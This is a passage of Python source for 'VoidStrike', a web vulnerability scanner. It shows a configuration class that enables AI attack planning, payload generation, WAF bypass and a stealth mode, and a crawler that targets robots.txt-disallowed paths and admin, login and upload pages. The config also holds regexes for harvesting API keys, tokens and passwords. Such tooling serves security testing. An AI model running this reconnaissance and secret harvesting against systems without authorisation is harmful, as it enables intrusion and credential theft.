#!/usr/bin/env python3
import os
import sys
import time
import json
import re
import hashlib
import random
import asyncio
import aiohttp
import aiofiles
from datetime import datetime, timedelta
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse, quote, unquote
from typing import List, Dict, Set, Optional, Any, Tuple, Union
from dataclasses import dataclass, field, asdict
from enum import Enum
from collections import defaultdict, Counter, deque
from pathlib import Path
import argparse
import signal
import pickle
import threading
import queue
import webbrowser
import subprocess
import tempfile
import base64
import binascii
import zlib
import gzip
import hashlib
import hmac
import uuid
import shutil
import glob
import fnmatch
import csv
import sqlite3
import yaml
import xml.etree.ElementTree as ET
import html
import cssutils
import jsbeautifier
from concurrent.futures import ThreadPoolExecutor, as_completed, ProcessPoolExecutor
import logging
from logging.handlers import RotatingFileHandler, QueueHandler, QueueListener
import warnings
warnings.filterwarnings('ignore')
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
urllib3.disable_warnings()
import socket
import dns.resolver
import dns.reversename
import dns.zone
import dns.query
import dns.update
import dns.tsigkeyring
import ipaddress
import netifaces
import paramiko
from paramiko import SSHClient, AutoAddPolicy
import ftplib
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from bs4 import BeautifulSoup, Comment, SoupStrainer
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, WebDriverException
from fake_useragent import UserAgent
import openai
from openai import AsyncOpenAI
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWebEngineWidgets import *
from PyQt5.QtChart import *
import pyqtgraph as pg
from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas
from matplotlib.figure import Figure
import matplotlib.pyplot as plt
import numpy as np
import pandas as pd
import plotly.graph_objects as go
import plotly.express as px
import plotly.offline as pyo
import networkx as nx
from networkx.drawing.nx_agraph import graphviz_layout
from colorama import init, Fore, Style, Back
init(autoreset=True)

class Config:
    VERSION = '1.0'
    BUILD = ''
    RELEASE_DATE = '2026'
    DEEPSEEK_API_KEY = ''
    OPENAI_API_KEY = ''
    ANTHROPIC_API_KEY = ''
    SHODAN_API_KEY = ''
    GITHUB_TOKEN = ''
    VIRUSTOTAL_API_KEY = ''
    SECURITYTRAILS_API_KEY = ''
    CENSYS_API_ID = ''
    CENSYS_API_SECRET = ''
    AI_MODEL = 'deepseek-chat'
    AI_TEMPERATURE = 0.3
    AI_MAX_TOKENS = 4000
    AI_TIMEOUT = 60
    AI_ENABLED = False
    AI_FALSE_POSITIVE_CHECK = True
    AI_PAYLOAD_GENERATION = True
    AI_VULNERABILITY_ANALYSIS = True
    AI_EXPLOIT_SUGGESTION = True
    AI_ATTACK_PLANNING = True
    AI_BUSINESS_LOGIC_ANALYSIS = True
    DEFAULT_THREADS = 200
    DEFAULT_TIMEOUT = 15
    DEFAULT_RETRIES = 5
    DEFAULT_DEPTH = 5
    DEFAULT_MAX_URLS = 10000
    DEFAULT_RATE_LIMIT = 100
    DEFAULT_SUBDOMAIN_DEPTH = 3
    MAX_REDIRECTS = 15
    ADAPTIVE_RATE_LIMIT = True
    AUTO_TIMEOUT_ADJUST = True
    SMART_RETRY = True
    BATCH_SIZE = 100
    QUEUE_SIZE = 5000
    CONNECTION_POOL_SIZE = 200
    MAX_MEMORY_USAGE = 1024 * 1024 * 1024
    CPU_THRESHOLD = 80
    BASE_DIR = Path.home() / '.voidstrike'
    CONFIG_FILE = BASE_DIR / 'config.yaml'
    DATABASE_FILE = BASE_DIR / 'voidstrike.db'
    SESSION_FILE = BASE_DIR / 'session.pkl'
    LOG_FILE = BASE_DIR / 'voidstrike.log'
    REPORTS_DIR = BASE_DIR / 'reports'
    PLUGINS_DIR = BASE_DIR / 'plugins'
    MODULES_DIR = BASE_DIR / 'modules'
    PAYLOADS_DIR = BASE_DIR / 'payloads'
    WORDLISTS_DIR = BASE_DIR / 'wordlists'
    SCREENSHOTS_DIR = BASE_DIR / 'screenshots'
    CACHE_DIR = BASE_DIR / 'cache'
    KNOWLEDGE_BASE_DIR = BASE_DIR / 'knowledge_base'
    USE_DATABASE = True
    DATABASE_TYPE = 'sqlite'
    POSTGRESQL_HOST = 'localhost'
    POSTGRESQL_PORT = 5432
    POSTGRESQL_USER = 'voidstrike'
    POSTGRESQL_PASSWORD = ''
    POSTGRESQL_DATABASE = 'voidstrike'
    CRAWLER_MAX_PAGES = 10000
    CRAWLER_MAX_DEPTH = 10
    CRAWLER_EXTERNAL_LINKS = False
    CRAWLER_RESPECT_ROBOTS = True
    CRAWLER_PARSE_JS = True
    CRAWLER_PARSE_FORMS = True
    CRAWLER_EXTRACT_PARAMETERS = True
    CRAWLER_EXTRACT_API_ENDPOINTS = True
    CRAWLER_SITEMAP_PARSE = True
    CRAWLER_ROBOTS_PARSE = True
    CRAWLER_RECURSIVE = True
    CRAWLER_SMART_LINK_PRIORITIZATION = True
    CRAWLER_SUBDOMAIN_CRAWL = True
    CRAWLER_DETECT_ADMIN_PANELS = True
    CRAWLER_DETECT_LOGIN_PAGES = True
    CRAWLER_DETECT_UPLOAD_FORMS = True
    CRAWLER_DETECT_API_ROUTES = True
    CRAWLER_PARSE_JSON_RESPONSES = True
    CRAWLER_FOLLOW_REDIRECTS = True
    CRAWLER_MAX_REDIRECTS = 5
    CRAWLER_DYNAMIC_PARAMETER_EXTRACTION = True
    CRAWLER_PARAMETER_CLUSTERING = True
    CRAWLER_REMOVE_DUPLICATE_PARAMETERS = True
    PARAM_DISCOVERY_FROM_URL = True
    PARAM_DISCOVERY_FROM_FORMS = True
    PARAM_DISCOVERY_FROM_JS = True
    PARAM_DISCOVERY_FROM_JSON = True
    PARAM_DISCOVERY_FROM_API = True
    PARAM_DISCOVERY_FROM_HIDDEN_INPUTS = True
    PARAM_DISCOVERY_FROM_HEADERS = True
    PARAM_DISCOVERY_FROM_COOKIES = True
    PARAM_DYNAMIC_EXTRACTION = True
    PARAM_CLUSTERING = True
    PARAM_DUPLICATE_REMOVAL = True
    PARAM_MAX_PARAMETERS_PER_URL = 120
    PARAM_MAX_TOTAL_PARAMETERS = 5500
    PARAM_JS_FILES_PER_PAGE = 22
    PARAM_JSON_ENDPOINTS_MAX = 42
    PARAM_API_PROBE_MAX = 24
    COMMON_PARAMETERS = ['id', 'page', 'cat', 'product', 'user', 'usr', 'username', 'name', 'email', 'mail', 'account', 'member', 'admin', 'root', 'action', 'do', 'method', 'func', 'function', 'cmd', 'command', 'exec', 'execute', 'run', 'process', 'task', 'job', 'file', 'path', 'dir', 'folder', 'directory', 'document', 'download', 'upload', 'load', 'read', 'show', 'view', 'include', 'require', 'page', 'start', 'offset', 'limit', 'count', 'perpage', 'per_page', 'num', 'number', 'index', 'from', 'to', 'max', 'min', 'q', 'query', 'search', 's', 'keywords', 'term', 'filter', 'sort', 'order', 'by', 'direction', 'asc', 'desc', 'token', 'key', 'api_key', 'apikey', 'auth', 'authorization', 'session', 'sess', 'sid', 'cookie', 'hash', 'secret', 'submit', 'send', 'ok', 'confirm', 'accept', 'agree', 'option', 'options', 'choice', 'select', 'check', 'debug', 'test', 'dev', 'develop', 'environment', 'env', 'mode', 'config', 'setting', 'settings', 'profile', 'uid', 'pid', 'cid', 'gid', 'fid', 'bid', 'aid', 'mid', 'user_id', 'product_id', 'category_id', 'order_id', 'format', 'type', 'output', 'callback', 'jsonp', 'response', 'data', 'info', 'detail', 'details', 'full', 'brief', 'date', 'time', 'year', 'month', 'day', 'hour', 'minute', 'from_date', 'to_date', 'start_date', 'end_date', 'lang', 'language', 'locale', 'country', 'region', 'city', 'ip', 'host', 'port', 'protocol', 'scheme', 'version', 'slug', 'ref', 'nonce', 'csrf', 'csrf_token', '_csrf', 'state', 'client_id', 'client_secret', 'grant_type', 'redirect_uri', 'access_token', 'refresh_token', 'fields', 'expand', 'include', 'exclude', 'filter_by', 'sort_by', 'order_by', 'page_size', 'per_page', 'cursor', 'next_token', 'pretty', 'graphql', 'operationName', 'variables', 'v', 'rev', 'cache', 'cb', '_', 'destination', 'returnUrl', 'return_url', 'redirect', 'next', 'tab', 'view', 'layout', 'ajax', 'partial', 'component']
    FUZZING_ENABLED = True
    FUZZING_MUTATION_BASED = True
    FUZZING_RANDOM_INPUT = True
    FUZZING_CONTEXT_AWARE = True
    FUZZING_PARAMETER_SPECIFIC = True
    FUZZING_ADAPTIVE = True
    FUZZING_MAX_PAYLOADS_PER_PARAM = 140
    FUZZING_ALWAYS_PROBE_GENERIC = True
    FUZZING_GENERIC_CAP = 16
    FUZZ_MAX_PARAMS_PER_SCAN = 128
    FUZZING_AUTO_MUTATION = True
    FUZZING_SMART_ENCODING = True
    FUZZING_FILTER_BYPASS_DETECTION = True
    FUZZING_MAX_DEPTH = 3
    FUZZING_TIMEOUT = 10
    FUZZING_MUTATIONS = ['case_randomization', 'url_encode', 'double_url_encode', 'html_encode', 'hex_encode', 'unicode_encode', 'null_byte', 'line_breaks', 'tab_injection', 'space_injection', 'comment_injection', 'sql_comment', 'js_comment', 'html_comment']
    AI_ANALYZER_ENABLED = False
    AI_ANALYZE_RESPONSES = True
    AI_DETECT_SUSPICIOUS_PATTERNS = True
    AI_CLASSIFY_VULNERABILITIES = True
    AI_SUGGEST_DEEPER_SCANS = True
    AI_DETECT_FALSE_POSITIVES = True
    AI_EXPLAIN_VULNERABILITY_RISK = True
    AI_GENERATE_SCAN_STRATEGY = True
    AI_ANOMALY_DETECTION = True
    AI_BEHAVIORAL_ANALYSIS = True
    AI_MAX_ANALYSIS_PER_SCAN = 100
    AI_MIN_CONFIDENCE = 0.6
    ATTACK_SURFACE_MAPPING = True
    MAP_ENDPOINTS = True
    MAP_PARAMETERS = True
    MAP_FORMS = True
    MAP_APIS = True
    MAP_LOGIN_SYSTEMS = True
    MAP_UPLOAD_AREAS = True
    MAP_ADMIN_PANELS = True
    GENERATE_VISUAL_GRAPH = True
    GRAPH_OUTPUT_FORMAT = 'html'
    GRAPH_MAX_NODES = 500
    WAF_DETECTION_ENABLED = True
    WAF_DETECT_CLOUDFLARE = True
    WAF_DETECT_AKAMAI = True
    WAF_DETECT_AWS = True
    WAF_DETECT_IMPERVA = True
    WAF_DETECT_F5 = True
    WAF_DETECT_SUCURI = True
    WAF_DETECT_MOD_SECURITY = True
    WAF_DETECT_RATE_LIMITING = True
    WAF_DETECT_REQUEST_FILTERING = True
    WAF_DETECT_BOT_PROTECTION = True
    WAF_RESPONSE_BEHAVIOR_ANALYSIS = True
    WAF_HEADER_DETECTION = True
    WAF_FINGERPRINT_DETECTION = True
    WAF_BYPASS_ATTEMPTS = True
    WAF_MAX_BYPASS_PAYLOADS = 20
    TECH_FINGERPRINTING = True
    TECH_DETECT_SERVER = True
    TECH_DETECT_FRAMEWORKS = True
    TECH_DETECT_CMS = True
    TECH_DETECT_JS_LIBRARIES = True
    TECH_DETECT_PROGRAMMING_LANGUAGES = True
    TECH_DETECT_DATABASES = True
    TECH_DETECT_OUTDATED_LIBRARIES = True
    TECH_DETECT_VULNERABLE_FRAMEWORKS = True
    TECH_CHECK_CVE_DATABASE = True
    TECH_MAX_TECHNOLOGIES = 50
    ASYNC_SCANNER_ENABLED = True
    ASYNC_MAX_CONCURRENT = 200
    ASYNC_ADAPTIVE_SPEED = True
    ASYNC_AUTO_TIMEOUT_TUNING = True
    ASYNC_SMART_RETRY = True
    ASYNC_MAX_RETRIES = 3
    ASYNC_RETRY_BACKOFF = 1.5
    ASYNC_CONNECTION_TIMEOUT = 10
    ASYNC_READ_TIMEOUT = 30
    ASYNC_POOL_SIZE = 100
    JS_ANALYZER_ENABLED = True
    JS_SCAN_FILES = True
    JS_DETECT_HIDDEN_ENDPOINTS = True
    JS_DETECT_API_KEYS = True
    JS_DETECT_TOKENS = True
    JS_DETECT_SECRETS = True
    JS_DETECT_INTERNAL_URLS = True
    JS_DETECT_EXPOSED_CREDENTIALS = True
    JS_DETECT_SENSITIVE_DATA_LEAKS = True
    JS_BEAUTIFY_CODE = True
    JS_MAX_FILE_SIZE = 1024 * 1024
    JS_MAX_FILES_PER_SCAN = 100
    JS_SECRET_PATTERNS = {'api_key': 'api[_-]?key["\\\']?\\s*[:=]\\s*["\\\']([a-zA-Z0-9_\\-]{20,})["\\\']', 'token': 'token["\\\']?\\s*[:=]\\s*["\\\']([a-zA-Z0-9_\\-]{20,})["\\\']', 'aws_key': 'AKIA[0-9A-Z]{16}', 'aws_secret': '[A-Za-z0-9/+=]{40}', 'google_api': 'AIza[0-9A-Za-z\\-_]{35}', 'github_token': 'github_pat_[a-zA-Z0-9]{22,}', 'jwt': 'eyJ[a-zA-Z0-9_\\-]+\\.[a-zA-Z0-9_\\-]+\\.[a-zA-Z0-9_\\-]+', 'password': 'password["\\\']?\\s*[:=]\\s*["\\\']([^"\\\']+)["\\\']', 'secret': 'secret["\\\']?\\s*[:=]\\s*["\\\']([^"\\\']+)["\\\']', 'private_key': '-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----'}
    RESPONSE_ANALYSIS_ENABLED = True
    RESPONSE_DETECT_ERROR_MESSAGES = True
    RESPONSE_DETECT_STACK_TRACES = True
    RESPONSE_DETECT_DEBUG_INFO = True
    RESPONSE_DETECT_DATABASE_ERRORS = True
    RESPONSE_DETECT_UNEXPECTED_BEHAVIOR = True
    RESPONSE_ANALYZE_HEADERS = True
    RESPONSE_ANALYZE_COOKIES = True
    RESPONSE_ANALYZE_STATUS_CODES = True
    RESPONSE_ANALYZE_CONTENT_TYPE = True
    RESPONSE_COMPARE_WITH_BASELINE = True
    RESPONSE_SIMILARITY_THRESHOLD = 0.8
    ERROR_PATTERNS = {'sql': ['sql', 'mysql', 'postgresql', 'oracle', 'sqlite', 'driver', 'odbc', 'jdbc', 'database error', 'syntax error', 'unclosed quotation', 'mysql_fetch'], 'php': ['php error', 'parse error', 'fatal error', 'warning', 'unexpected', 'undefined index', 'undefined variable'], 'python': ['traceback', 'exception', 'error', 'python', 'django', 'flask', 'wsgi'], 'java': ['exception', 'java', 'nullpointer', 'classnotfound', 'stacktrace', 'at java', 'caused by'], 'asp': ['asp error', 'vbscript', 'microsoft vbscript', 'runtime error', 'server object']}
    DASHBOARD_ENABLED = True
    DASHBOARD_SHOW_SCAN_PROGRESS = True
    DASHBOARD_SHOW_DISCOVERED_URLS = True
    DASHBOARD_SHOW_PARAMETERS = True
    DASHBOARD_SHOW_VULNERABILITIES = True
    DASHBOARD_SHOW_RISK_SCORE = True
    DASHBOARD_SHOW_ATTACK_SURFACE = True
    DASHBOARD_SHOW_REQUESTS_PER_SECOND = True
    DASHBOARD_SHOW_ERROR_RATE = True
    DASHBOARD_SHOW_RESPONSE_CODES = True
    DASHBOARD_REFRESH_INTERVAL = 1000
    SCAN_MODES = {'quick': {'threads': 50, 'depth': 2, 'timeout': 5, 'max_urls': 100, 'rate_limit': 50, 'fuzzing': False, 'js_analysis': False, 'subdomain_enum': False}, 'standard': {'threads': 100, 'depth': 3, 'timeout': 10, 'max_urls': 500, 'rate_limit': 100, 'fuzzing': True, 'js_analysis': True, 'subdomain_enum': True}, 'deep': {'threads': 200, 'depth': 5, 'timeout': 15, 'max_urls': 2000, 'rate_limit': 200, 'fuzzing': True, 'js_analysis': True, 'subdomain_enum': True}, 'stealth': {'threads': 20, 'depth': 3, 'timeout': 20, 'max_urls': 300, 'rate_limit': 20, 'fuzzing': False, 'js_analysis': False, 'subdomain_enum': False, 'random_delays': True, 'respect_robots': True}, 'aggressive': {'threads': 500, 'depth': 4, 'timeout': 5, 'max_urls': 5000, 'rate_limit': 500, 'fuzzing': True, 'js_analysis': True, 'subdomain_enum': True, 'no_delays': True}, 'api': {'threads': 100, 'depth': 2, 'timeout': 10, 'max_urls': 1000, 'rate_limit': 200, 'fuzzing': True, 'js_analysis': True, 'subdomain_enum': False, 'api_focused': True}}
    REPORT_GENERATOR_ENABLED = True
    REPORT_FORMATS = ['html', 'json', 'markdown', 'pdf', 'csv', 'xml']
    REPORT_DEFAULT_FORMAT = 'html'
    REPORT_INCLUDE_VULNERABILITY_DESCRIPTION = True
    REPORT_INCLUDE_SEVERITY_SCORE = True
    REPORT_INCLUDE_AFFECTED_URL = True
    REPORT_INCLUDE_REPRODUCTION_STEPS = True
    REPORT_INCLUDE_MITIGATION_ADVICE = True
    REPORT_INCLUDE_SCREENSHOTS = True
    REPORT_INCLUDE_REMOTE_NOTES = False
    REPORT_INCLUDE_TECHNOLOGY_STACK = True
    REPORT_INCLUDE_ATTACK_GRAPH = True
    REPORT_MAX_VULNERABILITIES = 1000
    DATABASE_ENABLED = True
    DATABASE_TYPE = 'sqlite'
    DATABASE_AUTO_CLEANUP = True
    DATABASE_CLEANUP_DAYS = 30
    DATABASE_MAX_RECORDS = 10000
    DATABASE_BACKUP_ENABLED = True
    DATABASE_BACKUP_INTERVAL = 86400
    PLUGIN_SYSTEM_ENABLED = True
    PLUGIN_AUTO_LOAD = True
    PLUGIN_MAX_PER_SCAN = 50
    PLUGIN_TIMEOUT = 30
    PLUGIN_ALLOW_EXTERNAL = False
    PLUGIN_SANDBOX = True
    BUILTIN_PLUGINS = ['sql_scanner', 'xss_scanner', 'lfi_scanner', 'ssrf_scanner', 'cmd_injection', 'idor_scanner', 'open_redirect', 'jwt_scanner', 'csrf_scanner', 'file_upload', 'auth_bypass', 'misconfig', 'sensitive_files', 'xxe_scanner', 'ssti_scanner', 'api_scanner', 'graphql_scanner', 'crawler', 'js_analyzer', 'tech_detector', 'waf_detector', 'response_analyzer']
    LIVE_MONITOR_ENABLED = True
    LIVE_MONITOR_SHOW_RPS = True
    LIVE_MONITOR_SHOW_VULNS = True
    LIVE_MONITOR_SHOW_PROGRESS = True
    LIVE_MONITOR_SHOW_ERROR_RATE = True
    LIVE_MONITOR_SHOW_RESPONSE_CODES = True
    LIVE_MONITOR_UPDATE_INTERVAL = 1
    LIVE_MONITOR_MAX_HISTORY = 100
    TARGET_PROFILER_ENABLED = True
    PROFILER_COLLECT_SERVER_INFO = True
    PROFILER_COLLECT_IP_INFO = True
    PROFILER_SCAN_PORTS = True
    PROFILER_ANALYZE_SSL = True
    PROFILER_COLLECT_DOMAIN_INFO = True
    PROFILER_WHOIS_LOOKUP = True
    PROFILER_DNS_ANALYSIS = True
    PROFILER_COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
    PROFILER_PORT_SCAN_TIMEOUT = 2
    RISK_SCORING_ENABLED = True
    RISK_SCORE_BASED_ON_EXPLOITABILITY = True
    RISK_SCORE_BASED_ON_IMPACT = True
    RISK_SCORE_BASED_ON_CONFIDENCE = True
    RISK_SCORE_BASED_ON_CVSS = True
    RISK_SCORE_MIN = 0
    RISK_SCORE_MAX = 10
    RISK_LEVELS = {'critical': (9, 10), 'high': (7, 8.9), 'medium': (4, 6.9), 'low': (1, 3.9), 'info': (0, 0.9)}
    CVSS_WEIGHTS = {'exploitability': 0.4, 'impact': 0.4, 'confidence': 0.2}
    AUTO_RESCAN_ENABLED = True
    AUTO_RESCAN_CONFIRM_VULNS = True
    AUTO_RESCAN_DEEPER_TESTS = True
    AUTO_RESCAN_REDUCE_FALSE_POSITIVES = True
    AUTO_RESCAN_MAX_ATTEMPTS = 3
    AUTO_RESCAN_MIN_CONFIDENCE = 0.7
    AUTO_RESCAN_DELAY = 5
    KNOWLEDGE_BASE_ENABLED = True
    KNOWLEDGE_BASE_INCLUDE_VULN_EXPLANATIONS = True
    KNOWLEDGE_BASE_INCLUDE_MITIGATION = True
    KNOWLEDGE_BASE_INCLUDE_REFERENCES = True
    KNOWLEDGE_BASE_INCLUDE_CVE_INFO = True
    KNOWLEDGE_BASE_INCLUDE_OWASP_INFO = True
    KNOWLEDGE_BASE_AUTO_UPDATE = True
    KNOWLEDGE_BASE_UPDATE_URL = 'https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/IndexASVS.md'
    KNOWLEDGE_BASE_CACHE_DAYS = 7
    GUI_THEME = 'light'
    GUI_WIDTH = 1680
    GUI_HEIGHT = 1020
    GUI_FONT = 'Segoe UI'
    GUI_FONT_SIZE = 10
    COLORS = {'primary': '#0a0a0a', 'primary_light': '#404040', 'primary_dark': '#000000', 'secondary': '#525252', 'success': '#171717', 'warning': '#737373', 'danger': '#000000', 'info': '#404040', 'background': '#ffffff', 'surface': '#fafafa', 'surface_dark': '#f4f4f5', 'text_primary': '#0a0a0a', 'text_secondary': '#525252', 'text_hint': '#a1a1aa', 'divider': '#e4e4e7', 'border': '#d4d4d8', 'shadow': 'rgba(0,0,0,0.08)'}
    _CONFIG_PATH_KEYS = frozenset({'BASE_DIR', 'CONFIG_FILE', 'DATABASE_FILE', 'SESSION_FILE', 'LOG_FILE', 'REPORTS_DIR', 'PLUGINS_DIR', 'MODULES_DIR', 'PAYLOADS_DIR', 'WORDLISTS_DIR', 'SCREENSHOTS_DIR', 'CACHE_DIR', 'KNOWLEDGE_BASE_DIR'})

    @classmethod
    def initialize(cls):
        cls.BASE_DIR.mkdir(exist_ok=True)
        cls.REPORTS_DIR.mkdir(exist_ok=True)
        cls.PLUGINS_DIR.mkdir(exist_ok=True)
        cls.MODULES_DIR.mkdir(exist_ok=True)
        cls.PAYLOADS_DIR.mkdir(exist_ok=True)
        cls.WORDLISTS_DIR.mkdir(exist_ok=True)
        cls.SCREENSHOTS_DIR.mkdir(exist_ok=True)
        cls.CACHE_DIR.mkdir(exist_ok=True)
        cls.KNOWLEDGE_BASE_DIR.mkdir(exist_ok=True)

    @classmethod
    def _backup_bad_config(cls):
        p = cls.CONFIG_FILE
        if not p.exists():
            return
        bad = p.with_suffix('.yaml.bad')
        n = 0
        while bad.exists():
            n += 1
            bad = p.with_suffix(f'.yaml.bad.{n}')
        try:
            p.rename(bad)
        except OSError:
            try:
                shutil.copy2(p, bad)
                p.unlink()
            except OSError:
                pass

    @classmethod
    def load(cls):
        if not cls.CONFIG_FILE.exists():
            return
        try:
            with open(cls.CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = yaml.safe_load(f)
        except (yaml.constructor.ConstructorError, yaml.YAMLError, OSError):
            cls._backup_bad_config()
            return
        if not isinstance(config, dict):
            return
        for (key, value) in config.items():
            if key in cls._CONFIG_PATH_KEYS:
                continue
            if not hasattr(cls, key):
                continue
            cur = getattr(cls, key, None)
            if isinstance(cur, Path):
                continue
            setattr(cls, key, value)

    @classmethod
    def save(cls):
        skip = frozenset({'initialize', 'load', 'save', '_backup_bad_config'})
        config = {}
        for key in dir(cls):
            if key.startswith('_') or key in skip:
                continue
            val = getattr(cls, key)
            if callable(val):
                continue
            if key in cls._CONFIG_PATH_KEYS or isinstance(val, Path):
                continue
            config[key] = val
        with open(cls.CONFIG_FILE, 'w', encoding='utf-8') as f:
            yaml.safe_dump(config, f, default_flow_style=False, allow_unicode=True, sort_keys=False)

class SmartCrawler:

    def __init__(self, http_client, config: Dict=None):
        self.http = http_client
        self.config = config or {}
        self.logger = logging.getLogger('smart-crawler')
        self.visited_urls = set()
        self.url_queue = deque()
        self.discovered_urls = []
        self.base_domain = None
        self.stats = {'total_urls': 0, 'admin_panels': [], 'login_pages': [], 'upload_forms': [], 'api_routes': [], 'parameters': []}

    async def crawl(self, start_url: str, depth: int=3) -> List[Dict]:
        self.base_domain = self._get_domain(start_url)
        if Config.CRAWLER_SITEMAP_PARSE:
            await self._parse_sitemap(start_url)
        if Config.CRAWLER_ROBOTS_PARSE:
            await self._parse_robots(start_url)
        self.url_queue.append((start_url, 0))
        while self.url_queue and len(self.visited_urls) < Config.CRAWLER_MAX_PAGES:
            (url, current_depth) = self.url_queue.popleft()
            if url in self.visited_urls or current_depth > depth:
                continue
            self.visited_urls.add(url)
            response = await self.http.get(url)
            if not response:
                continue
            page_info = await self._parse_page(response, url, current_depth)
            self.discovered_urls.append(page_info)
            if current_depth < depth:
                for link in page_info.get('links', []):
                    if link not in self.visited_urls:
                        self.url_queue.append((link, current_depth + 1))
            self.stats['total_urls'] = len(self.visited_urls)
            if page_info.get('is_admin'):
                self.stats['admin_panels'].append(url)
                self.logger.info(f'Admin panel detected: {url}')
            if page_info.get('is_login'):
                self.stats['login_pages'].append(url)
                self.logger.info(f'Login page detected: {url}')
            if page_info.get('has_upload'):
                self.stats['upload_forms'].append(url)
                self.logger.info(f'Upload form detected: {url}')
            if page_info.get('api_routes'):
                self.stats['api_routes'].extend(page_info['api_routes'])
            self.logger.info(f'Crawled: {url} (depth: {current_depth})')
        return self.discovered_urls

    async def _parse_sitemap(self, base_url: str):
        sitemap_url = urljoin(base_url, 'sitemap.xml')
        response = await self.http.get(sitemap_url)
        if response and response.get('content'):
            soup = BeautifulSoup(response['content'], 'xml')
            for loc in soup.find_all('loc'):
                url = loc.text
                self.url_queue.append((url, 1))

    async def _parse_robots(self, base_url: str):
        robots_url = urljoin(base_url, 'robots.txt')
        response = await self.http.get(robots_url)
        if response and response.get('content'):
            lines = response['content'].split('\n')
            for line in lines:
                if line.lower().startswith('disallow:'):
                    path = line.split(':', 1)[1].strip()
                    if path and path != '/':
                        full_url = urljoin(base_url, path)
                        self.url_queue.append((full_url, 1))

    async def _parse_page(self, response: Dict, url: str, depth: int) -> Dict:
        soup = BeautifulSoup(response.get('content', ''), 'html.parser')
        raw_html = response.get('content', '') or ''
        page_info = {'url': url, 'title': soup.title.string if soup.title else '', 'status_code': response.get('status', 0), 'content_type': response.get('content_type', ''), 'depth': depth, 'links': [], 'forms': [], 'scripts': [], 'api_routes': [], 'parameters': [], 'response_headers': dict(response.get('headers', {})), 'param_hints': [], 'is_admin': False, 'is_login': False, 'has_upload': False}
        for a in soup.find_all('a', href=True):
            href = a['href']
            full_url = urljoin(url, href)
            if self._is_valid_url(full_url):
                page_info['links'].append(full_url)
        for form in soup.find_all('form'):
            form_info = self._parse_form(form, url)
            page_info['forms'].append(form_info)
            if any((input_tag.get('type') == 'file' for input_tag in form.find_all('input'))):
                page_info['has_upload'] = True
        for script in soup.find_all('script', src=True):
            src = script['src']
            full_url = urljoin(url, src)
            page_info['scripts'].append(full_url)
        if Config.CRAWLER_DETECT_ADMIN_PANELS:
            page_info['is_admin'] = self._is_admin_panel(url, soup)
        if Config.CRAWLER_DETECT_LOGIN_PAGES:
            page_info['is_login'] = self._is_login_page(url, soup)
        if Config.CRAWLER_DETECT_API_ROUTES:
            page_info['api_routes'] = self._extract_api_routes(soup, url)
        if Config.CRAWLER_EXTRACT_PARAMETERS:
            page_info['parameters'] = self._extract_parameters(url, soup)
        page_info['param_hints'] = self._extract_inline_param_names(raw_html)
        return page_info

    def _extract_inline_param_names(self, html: str) -> List[str]:
        if not html:
            return []
        chunk = html[:1800000]
        found: Set[str] = set()
        skip = frozenset({'div', 'span', 'html', 'body', 'head', 'meta', 'link', 'script', 'style', 'http', 'https', 'true', 'false', 'null', 'void', 'var', 'let', 'const'})
        patterns = ['(?i)name\\s*=\\s*["\\\']([a-zA-Z_][\\w.-]{0,80})["\\\']', '(?i)\\b(?:for|id)\\s*=\\s*["\\\']([a-zA-Z_][\\w.-]{0,80})["\\\']', '[?&]([a-zA-Z_][\\w.-]{0,80})=', '(?i)operationName\\s*:\\s*["\\\']([^"\\\']+)["\\\']', '(?i)["\\\'](variables|extensions|query|mutationName)["\\\']\\s*:', '(?i)fetch\\s*\\(\\s*[`"\\\'][^`"\\\']*[?&]([a-zA-Z_][\\w-]{0,64})=', '(?i)axios\\.(?:get|post|put|delete|patch)\\s*\\(\\s*[`"\\\'][^`"\\\']*[?&]([a-zA-Z_][\\w-]{0,64})=', '(?i)\\$\\.(?:get|post|ajax)\\s*\\(\\s*[`"\\\'][^`"\\\']*[?&]([a-zA-Z_][\\w-]{0,64})=', '(?i)URLSearchParams\\s*\\([^)]*\\)\\.(?:get|has)\\s*\\(\\s*["\\\'](\\w+)["\\\']', '(?i)\\.params\\s*\\[\\s*["\\\'](\\w+)["\\\']\\s*\\]', '(?i)["\\\']([a-zA-Z_][\\w]{1,48})["\\\']\\s*:\\s*(?:null|true|false|\\d+\\s*[,}\\]])']
        for pat in patterns:
            try:
                for m in re.finditer(pat, chunk):
                    g = m.group(1) if m.lastindex else None
                    if not g or len(g) < 2 or g.lower() in skip:
                        continue
                    if g.isdigit():
                        continue
                    found.add(g)
            except re.error:
                continue
        return list(found)[:1800]

    def _parse_form(self, form, base_url: str) -> Dict:
        form_info = {'action': urljoin(base_url, form.get('action', '')), 'method': form.get('method', 'get').upper(), 'enctype': form.get('enctype', 'application/x-www-form-urlencoded'), 'inputs': []}
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_info = {'name': input_tag.get('name', ''), 'type': input_tag.get('type', 'text') if input_tag.name == 'input' else input_tag.name, 'value': input_tag.get('value', ''), 'required': input_tag.has_attr('required')}
            if input_info['name']:
                form_info['inputs'].append(input_info)
        return form_info

    def _is_admin_panel(self, url: str, soup: BeautifulSoup) -> bool:
        url_lower = url.lower()
        admin_keywords = ['admin', 'administrator', 'dashboard', 'cpanel', 'backend']
        if any((keyword in url_lower for keyword in admin_keywords)):
            return True
        if soup.title and any((keyword in soup.title.string.lower() for keyword in admin_keywords)):
            return True
        content = soup.get_text().lower()
        admin_indicators = ['admin', 'dashboard', 'control panel', 'system', 'management']
        indicator_count = sum((1 for ind in admin_indicators if ind in content))
        return indicator_count >= 3

    def _is_login_page(self, url: str, soup: BeautifulSoup) -> bool:
        url_lower = url.lower()
        login_keywords = ['login', 'signin', 'sign-in', 'log-in', 'auth']
